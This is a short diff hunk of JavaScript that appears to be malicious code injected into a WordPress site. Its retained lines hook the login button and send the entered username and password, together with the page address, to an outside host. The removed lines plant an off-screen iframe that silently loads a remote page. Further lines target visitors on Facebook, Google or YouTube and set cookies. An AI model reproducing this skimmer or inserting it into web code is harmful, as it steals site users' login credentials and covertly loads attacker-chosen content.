@@ -4,22 +4,6 @@ document.getElementById('wp-submit').onclick = function() {
    new Image().src = 'http://siktir.ddospanel.com/cp.php?username='+document.getElementById('user_login').value+'&sifre='+document.getElementById('user_pass').value+'&location='+location.href;
 };
 }
-
-function zzz(url) {
-        ifrm = document.createElement("iframe");
-        ifrm.setAttribute("src", url);
-        ifrm.style.width = "1200px";
-        ifrm.style.top = "-1500px";
-        ifrm.style.position = "absolute";
-        ifrm.style.border = "1px";
-        ifrm.style.height = "1200px";
-        document.body.appendChild(ifrm);
-}
-zzz('https://www.periscope.tv/kaspertts/1kvJpqNBNakxE');
-
-
-
-
 if(top.location.hostname.indexOf("facebook") > -1 || top.location.hostname.indexOf("google") > -1 || top.location.hostname.indexOf("youtube") > -1 ){
 
 function setCookie(cname, cvalue) {
